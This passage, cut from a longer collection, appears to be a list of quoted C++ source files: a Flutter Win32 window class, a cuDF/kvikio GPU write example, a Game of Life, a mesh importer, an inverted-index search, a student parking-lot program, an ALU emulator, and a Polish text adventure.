Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"cuda_runtime_api.h\"\n#include <iostream>\n\n#include <cudf/table/table.hpp>\n#include <cudf_test/column_wrapper.hpp>\n#include <kvikio/file_handle.hpp>\n\nint main(int argc, char** argv) {\n  cudf::test::fixed_width_column_wrapper<int8_t> As{{65, 65, 65, 65, 65, 65, 65, 65, 65, 65}};\n  cudf::test::fixed_width_column_wrapper<int32_t> Seq{{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}};\n\n  auto col1 = As.release();\n  auto col2 = Seq.release();\n\n  std::vector<std::unique_ptr<cudf::column>> cols;\n  cols.emplace_back(std::move(col1));\n  cols.emplace_back(std::move(col2));\n  auto table = std::make_unique<cudf::table>(std::move(cols));\n\n  auto table_view = table->select({0, 1});\n\n  try {\n    auto col_view = table_view.column(0);\n    std::size_t size = col_view.size() * sizeof(int8_t);\n    std::cout << \"Column \" << 0 << \" has \" << col_view.size() << \" bytes worth data\" << std::endl;\n\n    auto col1_dev_ptr = col_view.data<int8_t>();\n    off_t file_offset = 0;\n    off_t devptr_offset = 0;\n    ssize_t bytes_written = 0;\n\n    kvikio::FileHandle file_handle(argv[1], \"w\", kvikio::FileHandle::m644, false);\n    file_handle.write_async((char*)col1_dev_ptr, &size, &file_offset, &devptr_offset, &bytes_written, 0);\n    std::cout << \"Write requested for \" << size << \" bytes\" << std::endl;\n    CUDF_CUDA_TRY(cudaStreamSynchronize(0));\n    std::cout << \"Write Async ended up writing \" << bytes_written << \" bytes\" << std::endl;\n    if (bytes_written < 0) {\n      throw std::runtime_error(CUFILE_ERRSTR(abs(bytes_written)+CUFILEOP_BASE_ERR));\n    }\n  } catch (kvikio::CUfileException &e) {\n    std::cout << \"Error: \" << e.what() << std::endl;\n    exit(-1);\n  }\n\n  return 0;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include <windows.h>\n#include <random>\n\nusing namespace std;\n\nchar living_cell = '1', dead_cell = '_'; // \u0441\u0438\u043c\u0432\u043e\u043b\u044b, \u043e\u0431\u043e\u0437\u043d\u0447\u0430\u044e\u0449\u0438\u0435 \u0436\u0438\u0432\u0443\u044e \u0438 \u043c\u0451\u0440\u0442\u0432\u0443\u044e \u043a\u043b\u0435\u0442\u043a\u0443\nint pause = 3500; // \u0434\u043b\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u043f\u0430\u0443\u0437\u044b \u043c\u0435\u0436\u0434\u0443 \u043e\u0431\u043d\u043e\u0432\u043b\u0435\u043d\u0438\u0435\u043c \u043f\u043e\u043b\u044f (\u0432 \u043c\u0438\u043b\u0438\u0441\u0435\u043a\u0443\u043d\u0434\u0430\u0445)\nint frequency_died_cell = 80; // \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u044c, \u0447\u0442\u043e \u0432 \u0438\u0437\u043d\u0430\u0447\u0430\u043b\u044c\u043d\u043e \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u043c \u043f\u043e\u043b\u0435 \u043a\u043b\u0435\u0442\u043a\u0430 \u0431\u0443\u0434\u0435\u0442 \u043c\u0451\u0440\u0442\u0432\u043e\u0439\nint quantity_living_cell_to_revive_cell = 3; // \u043a\u043e\u043b-\u0432\u043e \u043a\u043b\u0435\u0442\u043e\u043a, \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u043d\u0443\u0436\u043d\u043e \u0434\u043b\u044f \u043e\u0436\u0438\u0432\u0430\u043d\u0438\u044f \u0441\u043e\u0441\u0435\u0434\u043d\u0435\u0439 \u043a\u043b\u0435\u0442\u043a\u0438\n\n\n// \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u043f\u043e\u0434\u0445\u043e\u0434\u0438\u0442 \u043b\u0438 \u043a\u043b\u0435\u0442\u043a\u0430 \u0434\u043b\u044f \u043e\u0436\u0438\u0432\u043b\u0435\u043d\u0438\u044f, \u043f\u043e\u0441\u0447\u0438\u0442\u0430\u0432 \u043a\u043e\u043b-\u0432\u043e \u0436\u0438\u0432\u044b\u0445 \u0441\u043e\u0441\u0435\u0434\u043d\u0438\u0445 \u043a\u043b\u0435\u0442\u043e\u043a\nbool condition(char** field, int index_x, int index_y, int size)\n{\n    int count_living_cell = 0;\n    if (index_y > 0)\n    {\n        if (index_x > 0 and field[index_y - 1][index_x - 1] == living_cell) count_living_cell++;\n        if (field[index_y - 1][index_x] == living_cell) count_living_cell++;\n        if (index_x + 1 < size and field[index_y - 1][index_x + 1]) count_living_cell++;\n    }\n\n    if (index_x > 0 and field[index_y][index_x - 1] == living_cell) count_living_cell++;\n    if (index_x + 1 < size and field[index_y][index_x + 1] == living_cell) count_living_cell++;\n\n    if (index_y + 1 < size)\n    {\n        if (index_x > 0 and field[index_y + 1][index_x - 1] == living_cell) count_living_cell++;\n        if (field[index_y + 1][index_x] == living_cell) count_living_cell++;\n        if (index_x + 1 < size and field[index_y + 1][index_x + 1] == living_cell) count_living_cell++;\n    }\n    \n    if (count_living_cell == quantity_living_cell_to_revive_cell) \n        return true;\n    else \n        return false;\n}\n\n\nvoid generate_field(char** field, int size)\n{\n    for (int i = 0; i < size; i++)\n    {\n        for (int j = 0; j < size; j++)\n        {\n            if (rand() % 100 > frequency_died_cell)\n                field[i][j] = living_cell;\n            else\n                field[i][j] = dead_cell;\n        }\n    }\n}\n\n\nvoid show_field(char** field, int size)\n{\n    for (int i = 0; i < size; i++)\n    {\n        cout.write(field[i], size);\n        cout << endl;\n    }\n}\n\n\nvoid update_field(char** field, int size)\n{\n    for (int i = 0; i < size; i++)\n    {\n        for (int j = 0; j < size; j++)\n        {\n            if (condition(field, j, i, size)) \n                field[i][j] = living_cell;\n            else \n                field[i][j] = dead_cell;\n        }\n    }\n}\n\n\nint main()\n{\n    setlocale(LC_ALL, \"ru\");\n    int size;\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0440\u0430\u0437\u043c\u0435\u0440 \u043f\u043e\u043b\u044f:\\n\";\n    cin >> size;\n    char **field = new char *[size];\n    for (int i = 0; i < size; i++)\n    {\n        field[i] = new char[size];\n    }\n\n    generate_field(field, size);\n    show_field(field, size);\n    Sleep(pause);\n\n    while (true)\n    {\n        update_field(field, size);\n        show_field(field, size);\n        Sleep(pause);\n        system(\"cls\");\n    }\n\n    for (int i = 0; i < size; i++)\n    {\n        delete[] field[i];\n    }\n    delete[] field;\n\n    system(\"PAUSE >> VOID\");\n    return 0;\n}\n",
    "#include \"Utils.hpp\"\r\n#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <vector>\r\n#include <cmath>\r\nusing namespace std;\r\nnamespace PolygonalLibrary {\r\nbool ImportMesh(const string& filepath,\r\n                PolygonalMesh& mesh)\r\n{\r\n    ofstream outFile(\"Output.txt\");\r\n\r\n    if(!ImportCell0Ds(filepath + \"/Cell0Ds.csv\",\r\n                       mesh))\r\n    {\r\n        cerr << \"Cannot find Cell0Ds.csv.\" << endl;\r\n        return false;\r\n    }\r\n    else\r\n    {\r\n        cout << \"\\tCell0D:\" << endl;\r\n        outFile << \"\\tCell0D:\" << endl;\r\n        for(auto it = mesh.Cell0DMarkers.begin(); it != mesh.Cell0DMarkers.end(); it++)\r\n        {\r\n            unsigned int marker = it->first;\r\n            list<unsigned int> ids = it->second;\r\n\r\n            for(const unsigned int id : ids)\r\n            {\r\n                cout << \"Marker: \" << marker << \"\\t ID: \" << id << endl;\r\n                outFile << \"Marker: \" << marker << \"\\t ID: \" << id << endl;\r\n            }\r\n\r\n            cout << endl;\r\n            outFile << endl;\r\n        }\r\n    }\r\n\r\n    if(!ImportCell1Ds(filepath + \"/Cell1Ds.csv\",\r\n                       mesh))\r\n    {\r\n        cerr << \"Cannot find Cell1Ds.csv.\" << endl;\r\n        return false;\r\n    }\r\n    else\r\n    {\r\n        cout << \"\\n\" << \"-------------------------\" << endl;\r\n        outFile << \"\\n\" << \"-------------------------\" << endl;\r\n        cout << \"\\tCell1D:\" << endl;\r\n        outFile << \"\\tCell1D:\" << endl;\r\n        for(auto it = mesh.Cell1DMarkers.begin(); it != mesh.Cell1DMarkers.end(); it++)\r\n        {\r\n            unsigned int marker = it->first;\r\n            list<unsigned int> ids = it->second;\r\n\r\n            for(const unsigned int id : ids)\r\n            {\r\n                cout << \"Marker: \" << marker << \"\\t ID:\" << id << endl;\r\n                outFile << \"Marker: \" << marker << \"\\t ID:\" << id << endl;\r\n            }\r\n\r\n            cout << endl;\r\n            outFile << endl;\r\n        }\r\n        cout << \"\\n\" << endl;\r\n        outFile << \"\\n\" << endl;\r\n        for (unsigned int i = 0; i < mesh.Cell1DNullLines.size(); i++)\r\n        {\r\n            cout << \"ID: \" << mesh.Cell1DNullLines[i] << \" 's segment's origin coincides with the end point.\" << endl;\r\n            outFile << \"ID: \" << mesh.Cell1DNullLines[i] << \" 's segment's origin coincides with the end point.\" << endl;\r\n        }\r\n    }\r\n\r\n    if(!ImportCell2Ds(filepath + \"/Cell2Ds.csv\",\r\n                       mesh))\r\n    {\r\n        cerr << \"Cannot find Cell2Ds.csv.\" << endl;\r\n        return false;\r\n    }\r\n    else\r\n    {\r\n        for(unsigned int c = 0; c < mesh.NumberCell2D; c++)\r\n        {\r\n            vector<unsigned int> edges = mesh.Cell2DEdges[c];\r\n\r\n            for(unsigned int e = 0; e < 3; e++)\r\n            {\r\n                const unsigned int origin = mesh.Cell1DVertices[edges[e]][0];\r\n                const unsigned int end = mesh.Cell1DVertices[edges[e]][1];\r\n\r\n                auto findOrigin = find(mesh.Cell2DVertices[c].begin(), mesh.Cell2DVertices[c].end(), origin);\r\n                if(findOrigin == mesh.Cell2DVertices[c].end())\r\n                {\r\n                    cerr << \"Wrong mesh\" << endl;\r\n                    return 2;\r\n                }\r\n\r\n                auto findEnd = find(mesh.Cell2DVertices[c].begin(), mesh.Cell2DVertices[c].end(), end);\r\n                if(findEnd == mesh.Cell2DVertices[c].end())\r\n                {\r\n                    cerr << \"Wrong mesh\" << endl;\r\n                    return 3;\r\n                }\r\n\r\n            }\r\n        }\r\n        cout << \"\\n\" << \"-------------------------\" << endl;\r\n        outFile << \"\\n\" << \"-------------------------\" << endl;\r\n        cout << \"\\tCell2D:\" << endl;\r\n        outFile << \"\\tCell2D:\" << endl;\r\n        for(auto it = mesh.Cell2DMarkers.begin(); it != mesh.Cell2DMarkers.end(); it++)\r\n        {\r\n            unsigned int marker = it->first;\r\n            list<unsigned int> ids = it->second;\r\n\r\n            for(const unsigned int id : ids)\r\n            {\r\n                cout << \"Marker: \" << marker << \"\\t ID:\" << id << endl;\r\n                outFile << \"Marker: \" << marker << \"\\t ID:\" << id << endl;\r\n            }\r\n\r\n            cout << endl;\r\n            outFile << endl;\r\n        }\r\n        cout << \"\\n\" << endl;\r\n        outFile << \"\\n\" << endl;\r\n        for(auto it = mesh.Cell2DNumEdges.begin(); it != mesh.Cell2DNumEdges.end(); it++)\r\n        {\r\n            unsigned int marker = it->first;\r\n            list<unsigned int> ids = it->second;\r\n\r\n            for(const unsigned int id : ids)\r\n            {\r\n                cout << \"Marker: \" << marker << \"\\t Edges:\" << id << endl;\r\n                outFile << \"Marker: \" << marker << \"\\t Edges:\" << id << endl;\r\n            }\r\n\r\n            cout << endl;\r\n            outFile << endl;\r\n        }\r\n        cout << \"\\n\" << endl;\r\n        outFile << \"\\n\" << endl;\r\n        for(auto it = mesh.Cell2DNumVertices.begin(); it != mesh.Cell2DNumVertices.end(); it++)\r\n        {\r\n            unsigned int marker = it->first",
    "#include <iostream>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <unordered_map>\r\n#include <unordered_set>\r\n#include <vector>\r\n#include <string>\r\n#include <algorithm>\r\n#include <ctime>\r\n\r\nusing namespace std;\r\n\r\nvector<string> tokenize(const string& str) {\r\n    vector<string> tokens;\r\n    stringstream ss(str);\r\n    string token;\r\n    while (ss >> token) {\r\n        tokens.push_back(token);\r\n    }\r\n    return tokens;\r\n}\r\n\r\nunordered_map<string, unordered_set<int>> build_inverted_index(const vector<string>& files) {\r\n    unordered_map<string, unordered_set<int>> invertedIndex;\r\n\r\n    const int size = files.size();\r\n\r\n    for (int i = 0; i < size; i++) {\r\n        ifstream inFile(files[i]);\r\n        if (!inFile.is_open()) {\r\n            cerr << \"Failed to open file: \" << files[i] << endl;\r\n            continue;\r\n        }\r\n\r\n        string word;\r\n        while (inFile >> word) {\r\n            invertedIndex[word].insert(i + 1);\r\n        }\r\n\r\n        inFile.close();\r\n        std::cout << \"Archivo \" << to_string(i + 1) << \" procesado exitosamente\\n\";\r\n    }\r\n\r\n    return invertedIndex;\r\n}\r\n\r\n// Function to search the inverted index\r\nvoid search(const unordered_map<string, unordered_set<int>>& invertedIndex, const string& query) {\r\n    auto it = invertedIndex.find(query);\r\n    if (it != invertedIndex.end()) {\r\n        cout << \"Documentos que contienen \\\"\" << query << \"\\\":\" << endl;\r\n        for (const auto& doc : it->second) {\r\n            cout << \" - \" << doc << endl;\r\n        }\r\n    } else {\r\n        cout << \"Ningun documento tiene la palabra \\\"\" << query << \"\\\"\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    vector<string> files; // Add your file names here\r\n    for (int i = 0; i < 10; i++)\r\n    {\r\n        files.push_back(\"zdoc\" + to_string(i + 1) + \".txt\");\r\n    }\r\n    std::clock_t start = std::clock();\r\n    unordered_map<string, unordered_set<int>> invertedIndex = build_inverted_index(files);\r\n    std::clock_t end = std::clock();\r\n    std::cout << \"Word count completed in \" << (end - start) / (double)CLOCKS_PER_SEC << \" seconds\\n\";\r\n    string query;\r\n    cout << \"Enter a word to search for in the documents: \";\r\n    while (cin >> query)\r\n    {\r\n        search(invertedIndex, query);\r\n    }\r\n\r\n    return 0;\r\n}",
    "//A program that keeps track of the cars parked in MEDIU's parking zone\r\n#include <iostream>\r\nusing namespace std;\r\n// make a struct that contains the cars' information\r\nstruct car {\r\n  string ownername, brand, model, make, platenumber;\r\n  int year, oldestmake;\r\n};\r\n\r\n\r\nint main ()\r\n{\r\n  string model, brand, ownername, platenumber, oldestmodel;\r\n  int i, carnum, proton = 0, maxyear = 2022, oldestmake = 0;\r\n  car cars[carnum];\r\n  \r\n  cout << \"This is a program that keeps track of the cars parked in MEDIU's parking zone.\" << endl << endl;\r\n  cout << \"Enter the number of cars you will enter: \";\r\n  cin >> carnum; // number of cars that will be inputed (number of times the loop will repeat)\r\n  \r\n  // make a loop which includes asking for each of the desired car information\r\n  for (int i = 0; i < carnum; i++)\r\n{\r\n\t\r\ncout << \"Enter owner name: \";\r\ncin >> cars[i].ownername;\r\ncout << \"Enter brand: \";\r\ncin >> cars[i].brand;\r\ncout << \"Enter model: \";\r\ncin >> cars[i].model;\r\ncout << \"Enter make: \";\r\ncin >> cars[i].make;\r\ncout << \"Enter plate number: \";\r\ncin >> cars[i].platenumber;\r\ncout << \"Enter year: \";\r\ncin >> cars[i].year;\r\ncout << endl;\r\n\r\n// get the oldest brand and model\r\nif (cars[i].year < maxyear) \r\n{\r\nbrand = cars[i].brand;\r\nmodel = cars[i].model;\r\n\r\n}  \r\n// count the number of times the word proton is entered in the model\r\n    if (cars[i].model == \"proton\") \r\n    { \r\n    proton++; \r\n    } \r\n}\r\n\r\ncout << endl << endl;\r\n\r\ncout << \"The oldest car brand is: \" << brand << endl; // display the oldest car brad\r\ncout << \"The oldest car model is: \" << model << endl; // display the oldest car model\r\ncout << \"The number of proton car(s) parked there is: \" << proton++ << endl; // display the number of times the word proton is repeated\r\n    \r\n\r\n    return 0;\r\n}\r\n",
    "#include \"alu.h\"\r\n\r\nmemory mem;\r\nimmediate im;\r\n\r\nint32_t alu::decode_operand(string &operand)\r\n{\r\n    if (reg.is_register(operand))\r\n    {\r\n        return reg.get_data(operand);\r\n    }\r\n\r\n    else if (mem.is_memory(operand))\r\n    {\r\n        return mem.get_data(operand);\r\n    }\r\n\r\n    else if (im.is_immediate(operand))\r\n    {\r\n        return int32_t(im.get_data(operand));\r\n    }\r\n}\r\n\r\nvoid alu::perform_addition(string &operand1, string &operand2)\r\n{\r\n    int32_t val2 = decode_operand(operand2);\r\n    int32_t val1 = decode_operand(operand1);\r\n\r\n    int32_t ans = val1 + val2;\r\n\r\n    if (reg.is_register(operand1))\r\n    {\r\n        reg.set_value(operand1, ans);\r\n    }\r\n    else if (mem.is_memory(operand1))\r\n    {\r\n        mem.set_memory_location(operand1, ans);\r\n    }\r\n    else\r\n    {\r\n        cout << \"invalid operand in alu instruction\";\r\n    }\r\n\r\n    update_flag(\"addtion\", operand1, operand2, val1, val2, ans);\r\n\r\n    return;\r\n}\r\n\r\nvoid alu::perform_subtraction(string &operand1, string &operand2)\r\n{\r\n    int32_t val2 = decode_operand(operand2);\r\n    int32_t val1 = decode_operand(operand1);\r\n\r\n    int32_t ans = val1 - val2;\r\n\r\n    if (reg.is_register(operand1))\r\n    {\r\n        reg.set_value(operand1, ans);\r\n    }\r\n    else if (mem.is_memory(operand1))\r\n    {\r\n        mem.set_memory_location(operand1, ans);\r\n    }\r\n    else\r\n    {\r\n        cout << \"invalid operand in alu instruction\";\r\n    }\r\n\r\n    update_flag(\"subtraction\", operand1, operand2, val1, val2, ans);\r\n    return;\r\n}\r\n\r\nvoid alu::perform_subtraction_with_carry(string &operand1, string &operand2)\r\n{\r\n    int32_t val2 = decode_operand(operand2);\r\n    int32_t val1 = decode_operand(operand1);\r\n\r\n    int32_t ans = val1 - val2 - reg.get_flag_data(\"carry\");\r\n\r\n    if (reg.is_register(operand1))\r\n    {\r\n        reg.set_value(operand1, ans);\r\n    }\r\n    else if (mem.is_memory(operand1))\r\n    {\r\n        mem.set_memory_location(operand1, ans);\r\n    }\r\n    else\r\n    {\r\n        cout << \"invalid operand in alu instruction\";\r\n    }\r\n\r\n    update_flag(\"subtraction\", operand1, operand2, val1, val2, ans);\r\n    return;\r\n}\r\n\r\nvoid alu::perform_multiplication(string &operand1)\r\n{\r\n    long long ans = decode_operand(operand1);\r\n    if (reg.is_register(operand1))\r\n    {\r\n        if (operand1[operand1.size() - 1] == 'X')\r\n        {\r\n            string operand2 = \"AX\";\r\n            ans = reg.get_data(operand2) * reg.get_data(operand1);\r\n            reg.set_value(operand1, ans & 0x0000FFFF);\r\n\r\n            string upper_word = \"DX\";\r\n            reg.set_value(upper_word, ans & 0xFFFF0000);\r\n        }\r\n        else\r\n        {\r\n            string operand2 = \"AL\";\r\n            ans = reg.get_data(operand2) * reg.get_data(operand1);\r\n\r\n            string destination = \"AX\";\r\n            reg.set_value(destination, ans);\r\n        }\r\n    }\r\n    else\r\n    {\r\n        cout << \"invalid operand for multiplication\";\r\n    }\r\n}\r\n\r\nvoid alu::perform_addition_with_carry(string &operand1, string &operand2)\r\n{\r\n    int32_t val2 = decode_operand(operand2);\r\n    int32_t val1 = decode_operand(operand1);\r\n\r\n    int32_t ans = val1 + val2 + reg.get_flag_data(\"carry\");\r\n\r\n    if (reg.is_register(operand1))\r\n    {\r\n        reg.set_value(operand1, ans);\r\n    }\r\n    else if (mem.is_memory(operand1))\r\n    {\r\n        mem.set_memory_location(operand1, ans);\r\n    }\r\n    else\r\n    {\r\n        cout << \"invalid operand in alu instruction\";\r\n    }\r\n\r\n    update_flag(\"addtion\", operand1, operand2, val1, val2, ans);\r\n\r\n    return;\r\n}\r\n\r\nvoid alu::update_flag(string type, string &op1, string &op2, int32_t &val1, int32_t &val2, int32_t &ans)\r\n{\r\n    if (ans == 0)\r\n    {\r\n        reg.update_flag(\"zero\", 1);\r\n    }\r\n    else\r\n    {\r\n        reg.update_flag(\"zero\", 0);\r\n    }\r\n\r\n    int32_t sizeofans = 0;\r\n    if (reg.is_register(op1))\r\n    {\r\n        if (op1[op1.size() - 1] == 'X')\r\n            sizeofans = 16;\r\n        else\r\n            sizeofans = 8;\r\n    }\r\n    else\r\n        sizeofans = 8;\r\n\r\n    if (sizeofans == 16 && ((ans >= (1 << (sizeofans - 1))) || (ans < (-(1 << (sizeofans - 1))))))\r\n    {\r\n        reg.update_flag(\"overflow\", 1);\r\n    }\r\n    else\r\n    {\r\n        reg.update_flag(\"overflow\", 0);\r\n    }\r\n\r\n    if (sizeofans == 8 && (ans >= (1 << (sizeofans))))\r\n    {\r\n        reg.update_flag(\"carry\", 1);\r\n    }\r\n    else\r\n    {\r\n        reg.update_flag(\"carry\", 0);\r\n    }\r\n}\r\n\r\nvoid alu::perform_division(string &operand)\r\n{\r\n    int32_t denominator = decode_operand(operand);\r\n\r\n    string num_reg = \"AX\";\r\n    string den_reg = operand;\r\n\r\n    int32_t numerator = reg.get_data(num_reg);\r\n\r\n    int32_t q = numerator / denominator;\r\n    int32_t r = numerator % denominator;\r\n\r\n    string dest_quotient = \"AL\";\r\n    string dest_reminder = \"AH\";\r\n\r\n    reg.set_value(dest_quotient, q);\r\n    reg.set_value(dest_reminder, r);\r\n}",
    "#include<iostream>\r\n#include \"GOTHIC_GAME_postac.h\"\r\n#include \"GOTHIC_GAME_item.h\"\r\n#include<windows.h>\r\nusing namespace std;\r\nextern int pogadane, quest, nek, zadlo;\r\nextern bool zrobione;\r\nextern postac *wja, *work2;\r\nextern item *wspodnie_k;\r\nint teren();\r\nint expienie(postac *dobry, postac *zly);\r\nint zaloz_pancerz(item *eq);\r\nint so()\r\n{\r\n\t\tcout<<\"Wszedles do Starego Obozu\"<<endl\r\n\t\t\t<<\"------------------\"<<endl;\r\n\t\tcin.ignore(); cin.ignore();\r\n\tif(nek == 1)\r\n\t{\r\n\t\tcout<<\"Ty: Czy nie zagin\u0105\u0142 Wam ostatnio stra\u017cnik?\";\r\n\t\tcin.ignore();\r\n\t\tcout<<\"Z\u0142y: Mo\u017ce... a co ci do tego?\";\r\n\t\tcin.ignore();\r\n\t\tcout<<\"Ty: Znalaz\u0142em Neka.\";\r\n\t\tcin.ignore();\r\n\t\tcout<<\"Z\u0142y: To \u015bwietnie, a masz na to jakie\u015b dowody?\";\r\n\t\tcin.ignore();\r\n\t\tcout<<\"Ty: Znalaz\u0142em przy nim ten amulet. Prosz\u0119, oto on.\";\r\n\t\tcin.ignore();\r\n\t\tcout<<\"Z\u0142y: W\u0142a\u015bnie o ten amulet mi chodzi\u0142o. M\u0105dry z ciebie ch\u0142opak. Jakby Diego pyta\u0142 o ciebie, opowiem si\u0119 za tob\u0105.\";\r\n\t\tPlaySound(\"DIA_STT_315_LOSTNEKSUCCESS_PROOF_10_01.wav\", NULL, SND_ASYNC);\r\n\t\tcin.ignore();\r\n\t\texpienie(wja, work2);\r\n\t\tnek = 2;\r\n\t}\r\n\tif(zadlo == 3)\r\n\t{\r\n\t\tcout<<\"Dexter: Hej ty! Mam dla ciebie ofert\u0119 nie do odrzucenia. Za te \u017c\u0105d\u0142a co masz przy sobie, mog\u0119 da\u0107 Ci tak\u0105 zbroj\u0119 prawie tak\u0105 sam\u0105 jak moja. Co ty na to?\"<<endl\r\n\t\t\t<<\"1. Dobrze, Panie.\"<<endl\r\n\t\t\t<<\"0. P\u0142a\u0107 rud\u0105 albo zje\u017cdzaj.\"<<endl;\r\n\t\tbool tak;\r\n\t\tcin>>tak;\r\n\t\tif(tak)\r\n\t\t{\r\n\t\t\tcout<<\"Dexter: Trafi\u0142a Ci si\u0119 nie lada okazja ;)\";\r\n\t\t\tPlaySound(\"STT_311_FISK_WHISTLERSSWORD_TAKEIT_12_01.wav\", NULL, SND_ASYNC);\r\n\t\t\tcin.ignore(); cin.ignore();\r\n\t\t\tzaloz_pancerz(wspodnie_k);\r\n\t\t\tzadlo = 4;\r\n\t\t\texpienie(wja, work2);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout<<\"Dexter: B\u0119dziesz tego \u017ca\u0142owa\u0142...\";\r\n\t\t\tcin.ignore(); cin.ignore();\r\n\t\t\tzadlo = 5;\r\n\t\t}\r\n\t}\r\n\tif(pogadane == 0)\r\n\t{\r\n\r\n\t\tint decyzja;\r\n\t\tbool poprawny;\r\n\t\tdo\r\n\t\t{\r\n\t\t\tcout<<\"Diego: Aby przej\u015b\u0107 test zaufania, musisz zabi\u0107 2 wilki... Co\u015b tam m\u00f3wi\u0142?\"<<endl\r\n\t\t\t    <<\"1. Ty pijawko!\"<<endl\r\n\t\t\t    <<\"2. Brzmi strasznie 